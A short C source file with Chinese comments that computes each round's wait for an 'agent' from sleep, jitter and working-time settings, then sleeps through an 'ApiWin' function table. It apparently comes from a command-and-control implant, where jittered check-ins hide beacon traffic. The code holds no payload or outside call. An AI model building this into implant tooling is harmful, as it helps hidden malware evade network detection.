// 文件作用：睡眠控制实现：根据 sleep、jitter、working time 控制 agent 每轮等待多久。
#include "WaitMask.h"

// WaitMask 根据 sleep、jitter 和工作时间限制决定本轮实际等待多久。
void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter) 
{
    ULONG maxSleepTime = 0;
    if (worktime) {
        maxSleepTime = worktime * 1000;
    }
    else if (sleepTime) {
        maxSleepTime = sleepTime * 1000;
        if (jitter) {
            ULONG deltaTime = 0;
            ULONG minTime = sleepTime * jitter / 100;
            if (minTime)
                deltaTime = GenerateRandom32() % minTime;
            if (deltaTime < maxSleepTime)
                maxSleepTime -= deltaTime;
        }
    }
    mySleep(maxSleepTime);
}

// mySleep 是 Sleep 的简单包装，方便统一走 ApiWin 函数表。
void mySleep(ULONG ms) 
{
    ApiWin->Sleep(ms);
}
